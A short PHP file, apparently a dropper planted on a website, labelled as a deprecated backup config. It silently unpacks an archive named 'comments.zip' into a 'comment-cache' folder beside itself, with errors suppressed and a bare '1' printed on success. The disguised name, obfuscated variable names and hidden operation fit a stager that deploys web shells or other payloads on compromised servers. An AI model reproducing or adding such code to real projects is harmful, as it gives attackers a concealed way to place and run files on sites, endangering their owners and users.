<?php
# backup_ref_config_deprecated
error_reporting(0);

$z1 = __DIR__ . '/comments.zip';
$e1 = __DIR__ . '/comment-cache';

if (!is_dir($e1)) {
    mkdir($e1, 0755, true);
}

if (file_exists($z1) && class_exists('ZipArchive')) {
    $u4 = new ZipArchive();
    if ($u4->open($z1) === TRUE) {
        if ($u4->extractTo($e1)) {
            $u4->close();
            echo "1";
            exit;
        }
    }
}

return;
